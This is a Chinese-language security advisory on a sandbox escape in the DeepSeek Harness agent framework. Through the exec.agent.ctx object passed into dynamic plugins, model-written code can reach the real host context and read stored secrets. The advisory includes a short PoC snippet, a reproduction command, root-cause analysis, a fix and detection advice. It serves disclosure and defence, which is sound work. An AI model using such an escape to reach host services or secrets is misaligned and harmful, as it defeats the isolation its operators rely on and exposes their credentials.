# QVD-2026-52644 — DeepSeek Harness VM 沙箱逃逸

> 系列归属：**DeepSeek Harness（DSH）** 上线 11 天内被奇安信披露的 5 个漏洞之一（开源当天 4 个中的第 3 个）。

## 漏洞速览

| 项 | 内容 |
|---|---|
| 漏洞编号 | **QVD-2026-52644**（奇安信 CERT 验证，暂无 CVE） |
| 产品 | DeepSeek Harness（`deepseek-ai/deepseek-harness`） |
| 漏洞类型 | 动态插件 VM 沙箱逃逸（read host service via `exec.agent.ctx`） |
| 危害等级 | **CVSS 高危** |
| 影响版本 | v0.1 开发者预览版（PoC 验证于 0.1.0-rc.5） |
| 披露时间 | 2026-08-13（奇安信 CERT） |
| 利用条件 | 模型可通过 `cordis_define` / `cordis_run` 写并运行动态插件（默认组合零审批） |

## 受影响范围

- 所有允许模型通过 `cordis_define` / `cordis_run` 动态挂载插件的 DSH 部署（默认组合下该路径无任何审批弹窗）。

## 根因分析

模型可通过 `cordis_define` / `cordis_run` 工具写代码并挂载为动态插件，在 `node:vm` “沙箱”里运行。团队其实认真做过对抗性设计——`sandbox-context.spec.ts` 的测试标题就是 “escape surface is closed”，覆盖了：

- `ctx.root` / `ctx.parent` / `ctx.scope` 等框架成员拒绝访问；
- `ctx.extend` / `ctx.isolate` 拒绝；
- 服务返回 Context 的拒绝（`denyContext`）；
- `tools.get` 只返回 schema 视图、不返回可调用 `ToolDefinition`。

**但 `execute(args, exec)` 这条路径漏了：**

```ts
// packages/extensions/cordis-host-runner/src/guard.ts:582-584
execute(args, exec) {
  return cloneJson(await rawExecute(args, exec), ...)
}
```

`exec`（`ToolRunContext`）被**原样透传**给 vm realm 里的模型代码，而 `exec.agent.ctx` 是**真实的运行时 Context**（`runtime-types.ts:64-75` 声明 `readonly ctx: Context`）。facade 防住了语法面，没防住对象图。

## 利用机制

模型代码经 `execute(args, exec)` 拿到宿主 `exec`，再 `exec.agent.ctx` 取出任意宿主服务（包括秘密存储），绕过 vm 沙箱隔离。

## PoC 分析

`exploit/poc-v4-exec-escape.ts`（来自 `zzszmyf/dsh-security-pocs`）走完整真实路径（runner.define → run 挂载 → 真实 registry 管线执行 → vm realm 代码经 `exec.agent.ctx` 取宿主服务）：

```ts
async execute(_args, exec) {
  const real = exec.agent.ctx                  // 真实运行时 Context，未被守卫剥离
  return real.get('pocSecretStore').read()     // => "HOST_SECRET_LEAKED"
}
// => [V4] sandbox-realm tool code retrieved from the host Context: "HOST_SECRET_LEAKED"
```

## 复现步骤

前置：DeepSeek Harness 源码 checkout + Node ≥ 22.3 + pnpm。

```sh
DSH_CHECKOUT=/path/to/deepseek-harness pnpm exec tsx /path/to/dsh-security-pocs/poc-v4-exec-escape.ts
```

预期输出：`[V4] sandbox-realm tool code retrieved from the host Context: "HOST_SECRET_LEAKED"`。

## 修复方案

- **P0**：给动态工具 `execute` 传入剥离 `agent.ctx` 的 facade exec（`guard.ts`），只暴露模型真正需要的受控表面。

## 检测排查

- 审查会话日志中模型是否调用了 `cordis_define` / `cordis_run`；
- 监控动态插件是否访问了非预期的宿主服务。

## 时间线

- 2026-08-13：奇安信 CERT 披露并验证（QVD-2026-52644）。
- 2026-08-17：安天发布漏洞风险提示。

## 参考资料

- 奇安信 CERT 披露（2026-08-13，QVD-2026-52644）
- PoC 仓库：https://github.com/zzszmyf/dsh-security-pocs （`poc-v4-exec-escape.ts`）
- 分析长文：《插件、沙箱与一个总钥匙：DeepSeek Harness 四个安全漏洞的发现与利用实录》

## 免责声明

本资料仅供授权安全研究与防御目的。请勿对已不拥有的系统运行相关 PoC。
